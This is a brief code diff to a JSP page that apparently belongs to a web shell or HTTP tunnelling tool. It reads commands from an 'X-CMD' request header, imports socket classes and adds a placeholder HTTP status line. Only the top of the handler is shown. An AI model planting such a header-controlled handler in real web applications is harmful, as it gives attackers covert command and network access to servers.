@@ -1,5 +1,6 @@
 <%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.*, java.net.UnknownHostException, java.net.Socket"%>
 <%
+    response.setStatus(HTTPCODE);
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
         String mark = cmd.substring(0,22);
